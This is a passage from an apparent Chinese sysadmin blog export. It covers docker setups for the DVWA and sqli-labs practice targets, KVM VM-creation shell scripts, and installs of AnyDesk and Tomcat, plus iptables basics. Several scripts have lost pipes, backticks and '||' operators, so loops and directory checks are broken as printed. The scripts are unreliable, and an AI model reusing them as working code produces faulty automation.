<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run --rm -it -p 80:80 vulnerables/web-dvwa</span><br></pre></td></tr></table></figure>

<p>至此搭建完成。<br>用浏览器访问80端口即可。</p>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>img镜像文件的刻录方式</title>
    <url>/archives/8d01ffe6.html</url>
    <content><![CDATA[<p>这次介绍一款img格式镜像文件的刻录方式,之所以接触到这款软件是因为要用旧电脑做一台软路由,这种刻录方式呢,可以在Windows系统中进行,也可以在PE中进行.下面先看下软件的使用方法的截图.首先进入Windows的cmd页面. </p>
<span id="more"></span>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092924.png"></p>
<p>首先是进入你镜像和软件所在的盘,切换盘符的命令就是盘符号加上冒号,上面的命令执行格式为: phy加tab键可以自动补全,由于我的硬盘大于2G,(如果是2G的U盘可以不用加-u参数)所以加上 -u 参数 后面跟上img镜像文件的名称(原镜像文件不是这个名字,这是我后来改的吗名字,只是为了好记),下面就是选择所要安装的盘了,由于我的电脑插的硬盘有点多 所以才会显示这么多,一般不会有这么多的设备,这里需要注意的是这里不显示比较明显的标识,我选择的是看第一个数字,(代表的是柱面数),由于电脑本身不自带这种可以看的东西,所以我下载了一个软件看的,效果如下: </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092923.png"> </p>
<p>这样就可以看到自己所想安装的盘了,选择完之后就可以进行下一步了,会出现一个选项 选择y就可以等着软件执行结束,镜像也就刻录完成了.</p>
<p>physdiskwrite: <a href="https://m0n0.ch/wall/physdiskwrite.php"></a><a href="https://m0n0.ch/wall/physdiskwrite.php">https://m0n0.ch/wall/physdiskwrite.php</a></p>
<p>另一个软件下载地址: <a href="http://www.diskgenius.cn/download.php"></a><a href="http://www.diskgenius.cn/download.php">http://www.diskgenius.cn/download.php</a></p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>img镜像刻录</tag>
      </tags>
  </entry>
  <entry>
    <title>docker搭建SQL注入练习平台</title>
    <url>/archives/7c8d8254.html</url>
    <content><![CDATA[<p>sql-labs是一款学习sql注入的开源平台，共有75种不同类型的注入。</p>
<span id="more"></span>

<h1 id="搜索镜像"><a href="#搜索镜像" class="headerlink" title="搜索镜像"></a>搜索镜像</h1><p><code>docker search sqli-labs</code></p>
<h1 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h1><p><code>docker pull acgpiano/sqli-labs</code></p>
<h1 id="查看镜像"><a href="#查看镜像" class="headerlink" title="查看镜像"></a>查看镜像</h1><p><code>docker images</code></p>
<h1 id="运行镜像"><a href="#运行镜像" class="headerlink" title="运行镜像"></a>运行镜像</h1><p><code>docker run -dt --name sqli -p 80:80 --rm acgpiano/sqli-labs</code></p>
<h1 id="访问IP的80端口"><a href="#访问IP的80端口" class="headerlink" title="访问IP的80端口"></a>访问IP的80端口</h1><p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/sql-libs.png"></p>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>sqli-labs</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>KVM创建虚拟机的改良版脚本</title>
    <url>/archives/3dac0d9c.html</url>
    <content><![CDATA[<p>此创建虚拟机的脚本为使用虚拟机xml文件为模板创建，非virt-install命令。当然，用virt-install命令也可以，但没有xml文件灵活，胜在方便简洁。</p>
<span id="more"></span>

<h2 id="centos底层镜像（minimal安装）"><a href="#centos底层镜像（minimal安装）" class="headerlink" title="centos底层镜像（minimal安装）"></a>centos底层镜像（minimal安装）</h2><p>此底层镜像minimal安装，配置了阿里云的yum源，以及关闭了firewalld和selinux，自启动iptables，也安装了一些常用的软件包，也删除了所有的Mac地址和UUID信息防止虚拟机冲突。 也可以自己制作底层镜像。 网盘链接：<a href="https://pan.baidu.com/s/1uOwHN6E1Yhp3fsIkO7b66w">https://pan.baidu.com/s/1uOwHN6E1Yhp3fsIkO7b66w</a> 提取码：29mp MD5校验码：f327b2c07b7fcd445ea4e5350c4c3c89 默认存放路径：/var/lib/libvirt/images/CentOS7.qcow2</p>
<h2 id="XML文件内容"><a href="#XML文件内容" class="headerlink" title="XML文件内容"></a>XML文件内容</h2><p>默认存放路径： /etc/libvirt/qemu/CentOS7.xml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;domain type=&#x27;kvm&#x27;&gt;</span><br><span class="line">  &lt;name&gt;NAME&lt;/name&gt;</span><br><span class="line">  &lt;memory unit=&#x27;GiB&#x27;&gt;MEM&lt;/memory&gt;</span><br><span class="line">  &lt;currentMemory unit=&#x27;GiB&#x27;&gt;MEM&lt;/currentMemory&gt;</span><br><span class="line">  &lt;vcpu placement=&#x27;static&#x27;&gt;VCPU&lt;/vcpu&gt;</span><br><span class="line">  &lt;os&gt;</span><br><span class="line">    &lt;type arch=&#x27;x86_64&#x27; machine=&#x27;pc-i440fx-rhel7.0.0&#x27;&gt;hvm&lt;/type&gt;</span><br><span class="line">    &lt;boot dev=&#x27;hd&#x27;/&gt;</span><br><span class="line">  &lt;/os&gt;</span><br><span class="line">  &lt;features&gt;</span><br><span class="line">    &lt;acpi/&gt;</span><br><span class="line">    &lt;apic/&gt;</span><br><span class="line">  &lt;/features&gt;</span><br><span class="line">  &lt;cpu mode=&#x27;custom&#x27; match=&#x27;exact&#x27; check=&#x27;partial&#x27;&gt;</span><br><span class="line">    &lt;model fallback=&#x27;allow&#x27;&gt;Broadwell-noTSX-IBRS&lt;/model&gt;</span><br><span class="line">  &lt;/cpu&gt;</span><br><span class="line">  &lt;on_poweroff&gt;destroy&lt;/on_poweroff&gt;</span><br><span class="line">  &lt;on_reboot&gt;restart&lt;/on_reboot&gt;</span><br><span class="line">  &lt;on_crash&gt;destroy&lt;/on_crash&gt;</span><br><span class="line">  &lt;pm&gt;</span><br><span class="line">    &lt;suspend-to-mem enabled=&#x27;no&#x27;/&gt;</span><br><span class="line">    &lt;suspend-to-disk enabled=&#x27;no&#x27;/&gt;</span><br><span class="line">  &lt;/pm&gt;</span><br><span class="line">  &lt;devices&gt;</span><br><span class="line">    &lt;emulator&gt;/usr/libexec/qemu-kvm&lt;/emulator&gt;</span><br><span class="line">    &lt;disk type=&#x27;file&#x27; device=&#x27;disk&#x27;&gt;</span><br><span class="line">      &lt;driver name=&#x27;qemu&#x27; type=&#x27;qcow2&#x27;/&gt;</span><br><span class="line">      &lt;source file=&#x27;/var/lib/libvirt/images/NAME.img&#x27;/&gt;</span><br><span class="line">      &lt;target dev=&#x27;vda&#x27; bus=&#x27;virtio&#x27;/&gt;</span><br><span class="line">    &lt;/disk&gt;</span><br><span class="line">    &lt;controller type=&#x27;pci&#x27; index=&#x27;0&#x27; model=&#x27;pci-root&#x27;/&gt;</span><br><span class="line">    &lt;controller type=&#x27;ide&#x27; index=&#x27;0&#x27;&gt;</span><br><span class="line">    &lt;/controller&gt;</span><br><span class="line">    &lt;controller type=&#x27;virtio-serial&#x27; index=&#x27;0&#x27;&gt;</span><br><span class="line">    &lt;/controller&gt;</span><br><span class="line">    &lt;interface type=&#x27;network&#x27;&gt;</span><br><span class="line">      &lt;source network=&#x27;vbr1&#x27;/&gt;</span><br><span class="line">      &lt;model type=&#x27;virtio&#x27;/&gt;</span><br><span class="line">    &lt;/interface&gt;</span><br><span class="line">    &lt;interface type=&#x27;network&#x27;&gt;</span><br><span class="line">      &lt;source network=&#x27;vbr2&#x27;/&gt;</span><br><span class="line">      &lt;model type=&#x27;virtio&#x27;/&gt;</span><br><span class="line">    &lt;/interface&gt;</span><br><span class="line">    &lt;serial type=&#x27;pty&#x27;&gt;</span><br><span class="line">      &lt;target type=&#x27;isa-serial&#x27; port=&#x27;0&#x27;&gt;</span><br><span class="line">        &lt;model name=&#x27;isa-serial&#x27;/&gt;</span><br><span class="line">      &lt;/target&gt;</span><br><span class="line">    &lt;/serial&gt;</span><br><span class="line">    &lt;console type=&#x27;pty&#x27;&gt;</span><br><span class="line">      &lt;target type=&#x27;serial&#x27; port=&#x27;0&#x27;/&gt;</span><br><span class="line">    &lt;/console&gt;</span><br><span class="line">    &lt;channel type=&#x27;unix&#x27;&gt;</span><br><span class="line">      &lt;target type=&#x27;virtio&#x27; name=&#x27;org.qemu.guest_agent.0&#x27;/&gt;</span><br><span class="line">    &lt;/channel&gt;</span><br><span class="line">    &lt;channel type=&#x27;spicevmc&#x27;&gt;</span><br><span class="line">      &lt;target type=&#x27;virtio&#x27; name=&#x27;com.redhat.spice.0&#x27;/&gt;</span><br><span class="line">    &lt;/channel&gt;</span><br><span class="line">    &lt;input type=&#x27;tablet&#x27; bus=&#x27;usb&#x27;&gt;</span><br><span class="line">    &lt;/input&gt;</span><br><span class="line">    &lt;input type=&#x27;mouse&#x27; bus=&#x27;ps2&#x27;/&gt;</span><br><span class="line">    &lt;input type=&#x27;keyboard&#x27; bus=&#x27;ps2&#x27;/&gt;</span><br><span class="line">    &lt;graphics type=&#x27;spice&#x27; autoport=&#x27;yes&#x27;&gt;</span><br><span class="line">      &lt;listen type=&#x27;address&#x27;/&gt;</span><br><span class="line">      &lt;image compression=&#x27;off&#x27;/&gt;</span><br><span class="line">    &lt;/graphics&gt;</span><br><span class="line">    &lt;video&gt;</span><br><span class="line">      &lt;model type=&#x27;qxl&#x27; ram=&#x27;65536&#x27; vram=&#x27;65536&#x27; vgamem=&#x27;16384&#x27; heads=&#x27;1&#x27; primary=&#x27;yes&#x27;/&gt;</span><br><span class="line">    &lt;/video&gt;</span><br><span class="line">    &lt;memballoon model=&#x27;virtio&#x27;&gt;</span><br><span class="line">    &lt;/memballoon&gt;</span><br><span class="line">  &lt;/devices&gt;</span><br><span class="line">&lt;/domain&gt;</span><br><span class="line"></span><br><span class="line">#如果修改了虚拟机磁盘的存放路径，注意修改28行虚拟机磁盘存放的位置</span><br><span class="line"># 如果需要在root下，请给root目录加r权限</span><br></pre></td></tr></table></figure>

<h2 id="网桥文件内容"><a href="#网桥文件内容" class="headerlink" title="网桥文件内容"></a>网桥文件内容</h2><p>默认存放路径 /etc/libvirt/qemu/networks/vbr1.xml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;network&gt;</span><br><span class="line">  &lt;name&gt;vbr1&lt;/name&gt;</span><br><span class="line">  &lt;forward mode=&#x27;nat&#x27;/&gt;</span><br><span class="line">  &lt;bridge name=&#x27;vbr1&#x27; stp=&#x27;on&#x27; delay=&#x27;0&#x27;/&gt;</span><br><span class="line">  &lt;ip address=&#x27;192.168.11.1&#x27; netmask=&#x27;255.255.255.0&#x27;&gt;</span><br><span class="line">    &lt;dhcp&gt;</span><br><span class="line">      &lt;range start=&#x27;192.168.11.50&#x27; end=&#x27;192.168.11.100&#x27;/&gt;</span><br><span class="line">    &lt;/dhcp&gt;</span><br><span class="line">  &lt;/ip&gt;</span><br><span class="line">&lt;/network&gt;</span><br><span class="line">#去除了uuid和mac地址，定义时可自动生成</span><br></pre></td></tr></table></figure>

<h2 id="变量声明"><a href="#变量声明" class="headerlink" title="变量声明"></a>变量声明</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">clone_img=用于cow的底层镜像（模板机）</span><br><span class="line">clone_xml=用于创建虚拟机的xml配置文件</span><br><span class="line">host_img=创建的虚拟机的磁盘存放路径</span><br><span class="line">host_xml=创建的虚拟机的xml文件存放路径</span><br></pre></td></tr></table></figure>

<h2 id="脚本文件内容"><a href="#脚本文件内容" class="headerlink" title="脚本文件内容"></a>脚本文件内容</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">#源镜像和源xml文件的路径</span><br><span class="line">src_img=&quot;/var/lib/libvirt/images/virtualmachine/centos7.qcow2&quot;</span><br><span class="line">src_xml=&quot;/etc/libvirt/qemu/centos7.xml&quot;</span><br><span class="line"></span><br><span class="line">#克隆机镜像和xml文件存放的路径</span><br><span class="line">dest_img_dir=&quot;/var/lib/libvirt/images/img/&quot;</span><br><span class="line">dest_xml_dir=&quot;/etc/libvirt/qemu/xml/&quot;</span><br><span class="line"></span><br><span class="line">#判断路径变量是否存在</span><br><span class="line">if [ ! -f $src_img ];then</span><br><span class="line">        echo &quot;Erroy: No found $src_img&quot; </span><br><span class="line">        exit 3</span><br><span class="line">fi</span><br><span class="line">if [ ! -f $src_xml ];then</span><br><span class="line">        echo &quot;Erroy: No found $src_xml&quot; </span><br><span class="line">        exit 3</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">[ -d $dest_img_dir ]  mkdir $dest_img_dir</span><br><span class="line">[ -d $dest_xml_dir ]  mkdir $dest_xml_dir</span><br><span class="line"></span><br><span class="line">#判断需要创建的虚拟机名字是否存在</span><br><span class="line">read -p &#x27;name  :  &#x27; name</span><br><span class="line">  [ -z &quot;$name&quot; ] &amp;&amp; echo -e &amp;&amp; echo &quot;name is empty&quot; &gt;&amp;2  &amp;&amp; exit 1</span><br><span class="line">  for i in virsh list --all  awk &#x27;&#123;print $2&#125;&#x27;  sed &#x27;1,2d;$d&#x27;</span><br><span class="line">    do</span><br><span class="line">      [ $name == $i ] &amp;&amp; echo &quot;name is conflict&quot; &gt;&amp;2 &amp;&amp; exit 2</span><br><span class="line">  done</span><br><span class="line"></span><br><span class="line">#判断内存变量是否合理并不超过8</span><br><span class="line">read -p &#x27;mem(G)   :[2]  &#x27; mem</span><br><span class="line">  mem=$&#123;mem:-2&#125;</span><br><span class="line">  [ -z &quot;$mem&quot; ] &amp;&amp;  echo -e &amp;&amp; echo &quot;mem is empty&quot; &gt;&amp;2 &amp;&amp; exit 1</span><br><span class="line">  if [[ $mem = *[!0-9]* ]]; then</span><br><span class="line">      echo -e</span><br><span class="line">      echo &quot;mem only is integer&quot; &gt;&amp;2</span><br><span class="line">      exit 2</span><br><span class="line">  fi</span><br><span class="line">  [ $mem -gt 8 ] &amp;&amp; echo -e &amp;&amp; echo &quot;mem is too large&quot; &gt;&amp;2 &amp;&amp; exit 3</span><br><span class="line"></span><br><span class="line">#判断cpu变量是否合理</span><br><span class="line">read -p &#x27;cpu   :[1]  &#x27; cpu</span><br><span class="line">  cpu=$&#123;cpu:-1&#125;</span><br><span class="line">  [ -z &quot;$cpu&quot; ] &amp;&amp;  echo -e &amp;&amp; echo &quot;cpu is empty&quot; &gt;&amp;2 &amp;&amp; exit 1</span><br><span class="line">  if [[ $cpu = *[!0-9]* ]]; then</span><br><span class="line">      echo -e</span><br><span class="line">      echo &quot;cpu only is integer&quot; &gt;&amp;2</span><br><span class="line">      exit 2</span><br><span class="line">  fi</span><br><span class="line">  [ $cpu -gt 4 ] &amp;&amp; echo -e &amp;&amp; echo &quot;cpu is too large&quot; &amp;&gt;2 &amp;&amp; exit 3</span><br><span class="line"></span><br><span class="line">#创建克隆机模板</span><br><span class="line">qemu-img create -b $src_img -f qcow2 $&#123;dest_img_dir&#125;$&#123;name&#125;.img &amp;&gt; /dev/null</span><br><span class="line">  [ $? -eq 0 ] &amp;&amp; echo -e &quot;\033[1mqemu-img                      \033[32m[Done]\033[0m&quot;</span><br><span class="line">  [ $? -ne 0 ] &amp;&amp; echo -e &quot;\033[1mqemu-img                      \033[31m[Failed]\033[0m&quot;</span><br><span class="line"></span><br><span class="line">#拷贝模板机的xml文件并修改参数</span><br><span class="line">cp $src_xml $&#123;dest_xml_dir&#125;$&#123;name&#125;.xml &amp;&gt; /dev/null</span><br><span class="line">sed -i &quot;s/NAME/$&#123;name&#125;/&quot; $&#123;dest_xml_dir&#125;$&#123;name&#125;.xml &amp;&gt; /dev/null</span><br><span class="line">sed -i &quot;s/MEM/$&#123;mem&#125;/&quot;   $&#123;dest_xml_dir&#125;$&#123;name&#125;.xml &amp;&gt; /dev/null</span><br><span class="line">sed -i &quot;s/VCPU/$&#123;cpu&#125;/&quot;  $&#123;dest_xml_dir&#125;$&#123;name&#125;.xml &amp;&gt; /dev/null</span><br><span class="line"></span><br><span class="line">#定义虚拟机</span><br><span class="line">virsh define $&#123;dest_xml_dir&#125;$&#123;name&#125;.xml &amp;&gt; /dev/null</span><br><span class="line">  [ $? -eq 0 ] &amp;&amp; echo -e &quot;\033[1mvirsh-define                  \033[32m[Done]\033[0m&quot;</span><br><span class="line">  [ $? -ne 0 ] &amp;&amp; echo -e &quot;\033[1mvirsh-define                  \033[31m[Failed]\033[0m&quot;</span><br><span class="line"></span><br><span class="line">#开启虚拟机</span><br><span class="line">virsh start $name &amp;&gt; /dev/null</span><br><span class="line">  [ $? -eq 0 ] &amp;&amp; echo -e &quot;\033[1mstart_host                    \033[32m[Done]\033[0m&quot;</span><br><span class="line">  [ $? -ne 0 ] &amp;&amp; echo -e &quot;\033[1mstart_host                    \033[31m[Failed]\033[0m&quot;</span><br></pre></td></tr></table></figure>

<h2 id="排错思路"><a href="#排错思路" class="headerlink" title="排错思路"></a>排错思路</h2><p>脚本分三部分，那一部分出错，会报红，哪一部分报红，就重复运行报红部分的命令，把变量替换为实际路径</p>
<ul>
<li>  qemu-img，此命令为</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">qemu-img create -b $clone_img -f qcow2</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<pre><code>此命令一般不会出错，出错原因可能是变量有问题，脚本路径不对
</code></pre>
<ul>
<li>virsh-define，命令为</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">virsh define $&#123;host_xml&#125;$&#123;name&#125;.xml</span><br></pre></td></tr></table></figure>

<p>错误原因较多，可能目录没有libvirt的读取权限，可能配置文件错误</p>
<ul>
<li>  host_start,命令为</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">virsh start $name</span><br></pre></td></tr></table></figure>

<p>此部分出错原因一般为虚拟机磁盘位置问题</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>kvm虚拟机</tag>
      </tags>
  </entry>
  <entry>
    <title>kali2020.4安装anydesk</title>
    <url>/archives/2ff0d2f5.html</url>
    <content><![CDATA[<p>适用于Kali Linux的AnyDesk软件包可在APT存储库中找到，将AnyDesk上游APT存储库添加到Kali Linux系统中，然后从该存储库安装AnyDesk。</p>
<span id="more"></span>

<h2 id="更新系统"><a href="#更新系统" class="headerlink" title="更新系统"></a>更新系统</h2><p>打开命令行并执行以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt upgrade</span><br></pre></td></tr></table></figure>

<h2 id="添加AnyDesk存储库"><a href="#添加AnyDesk存储库" class="headerlink" title="添加AnyDesk存储库"></a>添加AnyDesk存储库</h2><p>将AnyDesk存储库添加到Kali Linux：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo sh -c &#x27;echo &quot;deb http://deb.anydesk.com/ all main&quot; &gt; /etc/apt/sources.list.d/anydesk.list&#x27;</span><br></pre></td></tr></table></figure>
<p>导入AnyDesk GPG密钥以签署APT软件包：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -qO - https://keys.anydesk.com/repos/DEB-GPG-KEY | sudo apt-key add -</span><br></pre></td></tr></table></figure>
<h2 id="安装AnyDesk"><a href="#安装AnyDesk" class="headerlink" title="安装AnyDesk"></a>安装AnyDesk</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt -y update &amp;&amp; sudo apt -y install anydesk</span><br></pre></td></tr></table></figure>
<h2 id="安装依赖包"><a href="#安装依赖包" class="headerlink" title="安装依赖包"></a>安装依赖包</h2><p>如果安装时出现依赖包问题，则可以执行以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt --fix-broken install </span><br></pre></td></tr></table></figure>
<h2 id="运行AnyDesk"><a href="#运行AnyDesk" class="headerlink" title="运行AnyDesk"></a>运行AnyDesk</h2><p>在命令行执行命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">anydesk</span><br></pre></td></tr></table></figure>
<p>输入命令后就可以看到anydesk界面啦。</p>
]]></content>
      <categories>
        <category>网络安全攻防</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>anydesk</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux平台下用shell脚本批量创建虚拟机（KVM）</title>
    <url>/archives/34505433.html</url>
    <content><![CDATA[<p>参照上篇博客编写的脚本，具体的东西就不介绍了，如果看不懂的请移步：<a href="https://vkali.com/archives/3dac0d9c.html" title="KVM虚拟机的改良版脚本">KVM虚拟机的改良版脚本</a> 脚本为比较初级的版本，内存，CPU的大小默认为模板机的内存和CPU大小。</p>
<span id="more"></span>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">src_img=&quot;/var/lib/libvirt/images/.centos7.qcow2&quot;</span><br><span class="line">src_xml=&quot;/etc/libvirt/qemu/.centos.xml&quot;</span><br><span class="line"></span><br><span class="line">dest_img_dir=&quot;/var/lib/libvirt/images/img/&quot;</span><br><span class="line">dest_xml_dir=&quot;/etc/libvirt/qemu/xml/&quot;</span><br><span class="line"></span><br><span class="line">read -p &quot;请输入创建虚拟机的数量：&quot; number</span><br><span class="line"></span><br><span class="line">num=1</span><br><span class="line">host=0</span><br><span class="line"></span><br><span class="line">while :</span><br><span class="line">do</span><br><span class="line">       for i in seq $number</span><br><span class="line">       do</span><br><span class="line">             name=server$&#123;num&#125;</span><br><span class="line"></span><br><span class="line">             if [ -e $dest_img_dir/$name.img ];then</span><br><span class="line">                   num=$[$num+1]</span><br><span class="line"></span><br><span class="line">                   continue</span><br><span class="line"></span><br><span class="line">            else</span><br><span class="line"></span><br><span class="line">                  qemu-img create -b $src_img -f qcow2 $&#123;dest_img_dir&#125;$&#123;name&#125;.img &amp;&gt; /dev/null</span><br><span class="line"></span><br><span class="line">                  cp $src_xml $&#123;dest_xml_dir&#125;$&#123;name&#125;.xml &amp;&gt; /dev/null</span><br><span class="line"></span><br><span class="line">                  sed -i &quot;s/NAME/$&#123;name&#125;/&quot; $&#123;dest_xml_dir&#125;$&#123;name&#125;.xml &amp;&gt; /dev/null</span><br><span class="line"></span><br><span class="line">                  virsh define $&#123;dest_xml_dir&#125;$&#123;name&#125;.xml &amp;&gt; /dev/null</span><br><span class="line"></span><br><span class="line">                  virsh start $name &amp;&gt; /dev/null</span><br><span class="line">                   echo -e &quot;\033[创建并启动虚拟机.......                     \033[32m[OK]\033[0m&quot;</span><br><span class="line">                   host=$[$host+1]</span><br><span class="line">           fi</span><br><span class="line"></span><br><span class="line">      done</span><br><span class="line"></span><br><span class="line">      if [ $host -eq $number ];then</span><br><span class="line"></span><br><span class="line">           exit</span><br><span class="line">      fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><p>写完脚本之后，运行时可以使用下面命令查看运行过程：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost /]# sh -x 脚本名称 </span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>shell批量创建虚拟机</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux平台下安装Tomcat8.5(centos7)</title>
    <url>/archives/bbcc8e56.html</url>
    <content><![CDATA[<p>搭建的这个服务也是基于阿里的云主机,首先访问<a href="https://tomcat.apache.org/download-80.cgi" title="tomcat">tomcat</a>的官网.下载这个版本: </p>
<span id="more"></span>

<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092918.png"></p>
<p>复制下链接.</p>
<h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@centos ~]# wget http://mirror.bit.edu.cn/apache/tomcat/tomcat-8/v8.5.45/bin/apache-tomcat-8.5.45.tar.gz</span><br><span class="line">[root@centos ~]# tar -zxvf apache-tomcat-8.5.45.tar.gz</span><br><span class="line">[root@centos ~]# mv apache-tomcat-8.5.45 /usr/local/tomcat</span><br><span class="line">[root@centos ~]# yum -y install java</span><br><span class="line">[root@centos ~]# systemctl status httpd //查看http是否启动如果没有启动</span><br><span class="line">[root@centos ~]# systemctl start httpd //如果没有http软件,下载一下</span><br><span class="line">[root@centos ~]# yum -y install httpd</span><br><span class="line">[root@centos ~]# /usr/local/tomcat/bin/startup.sh  //启动tomcat</span><br><span class="line">[root@centos ~]# /usr/local/tomcat/bin/shutdown.sh //关闭tomcat</span><br><span class="line">[root@centos ~]# netstat -antpu  grep 8080 //查看tomcat是否运行,8080为默认端口</span><br></pre></td></tr></table></figure>

<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>用浏览器访问服务器的8080端口,看看是否正常,注:阿里云需修改安全组策略.访问以下界面证明成功 </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092917.png"></p>
<p>创建jsp测试页面:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@centos ~]# cat  /usr/local/tomcat/webapps/ROOT/test.jsp</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">Now time is: &lt;%=new java.util.Date()%&gt;            //显示服务器当前时间</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>浏览器访问测试: </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092916.png"></p>
<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><p>如果检查端口时，8005端口启动非常慢，默认tomcat启动需要从/dev/random读取大量的随机数据，默认该设备生成随机数据的速度很慢，可用使用下面的命令用urandom替换random（非必须操作）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@centos ~]# mv /dev/random  /dev/random.bak</span><br><span class="line">[root@centos ~]# ln -s /dev/urandom  /dev/random</span><br></pre></td></tr></table></figure>

<p>第二种方法:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[root@centos ~]# yum install rng-tools</span><br><span class="line">[root@centos ~]# systemctl start rngd</span><br><span class="line">[root@centos ~]# systemctl enable rngd</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>linux安搭建Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux下iptables的基础配置</title>
    <url>/archives/6a643c5e.html</url>
    <content><![CDATA[<p>整理的Linux的IPtables资料，目前工作中基本用不到，记录一下。</p>
<span id="more"></span>

<h2 id="iptables常用命令"><a href="#iptables常用命令" class="headerlink" title="iptables常用命令"></a>iptables常用命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -A 追加一条防火墙规则至链的末尾位置</span><br><span class="line">iptables -I 插入一条防火墙规则至链的开头</span><br><span class="line">iptables -L 查看iptables所有规则</span><br><span class="line">iptables -n 以数字形式显示地址,端口等信息</span><br><span class="line">iptables - -line-numbers 查看规则时,显示规则的行号</span><br><span class="line">iptables -D 删除链内指定序号(或内容)的一条规则</span><br><span class="line">iptables -F 清空所有规则</span><br><span class="line">iptables -P 为指定链设置默认规则</span><br></pre></td></tr></table></figure>

<h2 id="iptables框架"><a href="#iptables框架" class="headerlink" title="iptables框架"></a>iptables框架</h2><h2 id="iptables的4个表"><a href="#iptables的4个表" class="headerlink" title="iptables的4个表"></a>iptables的4个表</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nat表(地址转换表)</span><br><span class="line">filter表(数据过滤表)</span><br><span class="line">raw表(状态跟踪表)</span><br><span class="line">mangle表(包标记表)</span><br></pre></td></tr></table></figure>

<h2 id="iptables的5个链"><a href="#iptables的5个链" class="headerlink" title="iptables的5个链"></a>iptables的5个链</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INPUT链(入站规则)</span><br><span class="line">OUTPUT链(出站规则)</span><br><span class="line">FORWARD链(转发规则)</span><br><span class="line">PREROUTING链(路由前规则)</span><br><span class="line">POSTROUTING链(路由后规则)</span><br></pre></td></tr></table></figure>

<h2 id="iptables语法格式"><a href="#iptables语法格式" class="headerlink" title="iptables语法格式"></a>iptables语法格式</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables  [-t 表名]  选项  [链名]  [条件]  [-j 目标操作]</span><br><span class="line">//注意事项与规律：</span><br><span class="line">//可以不指定表，默认为filter表</span><br><span class="line">//可以不指定链，默认为对应表的所有链</span><br><span class="line">//如果没有找到匹配条件，则执行防火墙默认规则</span><br><span class="line">//选项/链名/目标操作用大写字母，其余都小写</span><br><span class="line">**************************************************</span><br><span class="line">//目标操作：</span><br><span class="line">// ACCEPT：允许通过/放行</span><br><span class="line">// DROP：直接丢弃，不给出任何回应</span><br><span class="line">// REJECT：拒绝通过，必要时会给出提示</span><br><span class="line">// LOG：记录日志，然后传给下一条规则</span><br></pre></td></tr></table></figure>

